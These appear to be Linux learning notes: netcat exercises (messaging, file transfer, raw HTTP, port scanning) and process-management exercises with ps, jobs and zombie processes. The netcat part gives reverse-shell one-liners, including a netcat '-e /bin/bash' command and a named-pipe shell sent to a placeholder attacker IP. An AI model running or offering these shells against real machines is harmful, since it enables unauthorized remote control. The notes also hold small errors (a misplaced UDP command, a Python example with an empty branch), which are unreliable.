

## netcat-exercise

### Raw Socket  communication ( Simple mesage channel)
---

Server-side:
```bash
nc -l <port>
```

Client-side:
```bash
nc <server_ip> <port>
```
Then type messages both ways.

### File Transfer Over raw TCP
---

Sever-side:
```bash
nc -l <port> > file_placeholder
```

Client-side
```bash
nc <server_ip> <port> < file_to_transfer>
```
 **Observe:**
- no retry
- no integrity check
- no protocol overhead

**Goal:**
Understand:
> sockets don’t guarantee file semantics, only byte delivery

### HTTP without HTTP tools (socket-level HTTP)
---

Server
```
nc -l 8080
```

Client
```
nc <VM_IP> 8080
```
 Then type:
 ```
GET / HTTP/1.1
Host: test
 ```
### Port Scanning (basic recon simulation)
---

Server-side:
```Bash
nc -lkv <port>
```

Client side:
```bash
nc -zv <server_ip> <start_port> — <end_port>
```

### Reverse shell simulation (safe local only)
---

Attacker side(listener):
```
nc -lvp <port>
```

Target side(compromised machine — attacker will leave a backdoor)
```
nc <attacker_ip> <port> -e /bin/bash
```

>[!Note] 
>If your system's version of Netcat lacks the `-e` flag, you can achieve the exact same behavior using native shell features.
>
>**The Named Pipe (FIFO) Method**
>
>This is done in a victims compromised machine.
>```bash
>mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [Attacker_IP] 4444 > /tmp/f
>```
>


### UDP vs TCP behavior test
---
Server:
```bash
UDP vs TCP behavior test
```

Client:
```bash
nc -u <VM_IP> 4444
```
Then try:
```
- send messages
- compare with TCP
  
Observe:
- no connection handshake
- no reliability
- possible message loss/order change
```

### Socket behavior experiments (important learning)
---
```
A. Abrupt disconnect
- kill listener while sending data
  
Observe:
- broken pipe / reset connection
```

### “Multiple clients (TCP limitation test)
---
```
Try connecting multiple phones/instances.
Observe:
- nc usually handles one connection at a time unless looped
```

### “Invisible protocol” exercise
```bash
nc -l 5555
```
Then:
```
Send random data:
- text
- binary file
- long stream

Then inspect:
- `hexdump`
- `xxd`
  
Goal:
Understand:
> sockets don’t care about format, everything becomes bytes
```

---


## PROCESS exercise

### Locate the current process running in current shell
```
echo $$
ps -ef | grep [PID]

or
ps aux | grep [PID]
```

### Observe Parent-Child Relationships
```
sleep 300

#Open another terminal and Run

ps -ef | grep sleep
```
Look at the PID and find out who created the `sleep`. Then find the parent.

### Sorting
```
ps aux --sort=-%cpu
ps aux --sort=-%mem
```
The `-` means descending(biggest first)

#### Launch Multiple Copies
```
sleep 300 &
sleep 300 &
sleep 300 &
	## THE `&` FREES UP THE TERMINAL CREATES THE PROCESS SILENTLY IN THE BACKGROUND. Closing the terminal will close that bg process too.

#OPEN ANOTHER TERMINAL THEN:

ps -ef | grep sleep
```
Notice that the 3 process has 3 different PID's but same PPID.
This reinforce the [[PROCESS#The kernel's role in process management]] about resouirce management and isolation.

### Observer CPU time
```
yes > /dev/null

	## THE yes command REPEATEDLY OUTPUTS A STRING OF OF YES UNTIL FORCIBLY STOPPED.
	example : yes | rm -rf <folder>

#OPEN IN ANOTHER TERMINAL
ps aux | grep yes
```
Watch the `%CPU` and the `TIME`  near the 100% on one core.

### Customize the output
Instead of printing everything
```
ps -eo pid,user,ppid,comm
```
Useful for scripting and reports

### View the process states
```
ps aux | awk '{print $8}' | sort | uniq -c
```
**Security angle:** 
`D` state processes piling up = something is wrong with disk or a process is stuck. 
`Z` state piling up = a parent process is misbehaving (or was killed before cleaning up its children — which attackers sometimes exploit deliberately).

### Bring a process to Background and Foreground
Setup a playground processs 
```
#Terminal 1
sleep 10000

#Second Terminal | see the state
ps aux | grep sleep
```
Pause It:
```
#In terminal 1 
ctrl + z
Now the sleep processes is halted, saved in memory but bot killed yet.

#In terminal 2 
ps aux | grep sleep
```
List the paused process and Put it in background
```
#Terminal 1 
jobs

#Terminal 1
bg
	Its now continued in background, Check in the 2nd terminal to have it an S state

#Terminal 2
ps aux | grep sleep

```
Bring it to foreground
```
fg %1

or

fg 1

```
**Using ping command**
```
#terminal 1
ping <example.com> 
```
Put it to stopped/pause, Then bring it to background
```
ctrl + z
bg %1
	Notice that it still displaying outputs. 
```
You cant ctrl+c it to kill but you can still sends commands through terminal. 
Bring it to foreground first before terminating it.
```
fg %1
ctrl + c
```

#### **Practical Usage in Real world**
>Suppose your limited to single terminal only

>*Downloading a large file*
```
wget https://example.com/linux.iso
```
You realize halfway through that you want to check disk usage.
```
ctrl + z
#Resume it
bg
```
Now you can do
```
df -h
free -h
ps aux....and many more
```

>*long running Scrip*
```
./backup.sh
```
It may take 30 minutes.
Instead of opening another terminal:
```
Ctrl + Z
bg
```
Now it can be monitored while doing some things:
```
jobs
ps -ef | grep backup
```

>*Long file transfer via SSH*
Suppose you're SSH'd into a remote machine and want to copy a large file back to your local machine.
```
scp huge_backup.tar.gz you@your-laptop:/home/you/
```
If you realize it's going to take 30 minutes, you could:
1. Press `Ctrl+Z`
2. Run `bg`
Now the `scp` transfer continues in the background, and your shell is free for other tasks like:
```
ls
df -h
journalctl
ps aux
```

>*Copying from remote machine back to your local machine*
```
scp user@remote:/var/log/big.log .
```
You can directly start it in background
```
scp user@remote:/backups/huge.tar.gz . &
```
If its already running:
```
Ctrl+Z
bg
```
Now the transfer continues in the background on your local machine


#### Creating Zombie Process
Nomal, no zombie:
```python
import os
import time

pid = os.fork()

if pid > 0:
    os.wait()   # parent cleans up
else:
    exit(0)
```
Now run it:
```
python3 <file>
```
Now remove the `wait()`
```python
import os
import time

pid = os.fork()

if pid > 0:

else:
    exit(0)
```
Then run and check the  `ps aux`. A zombie appears.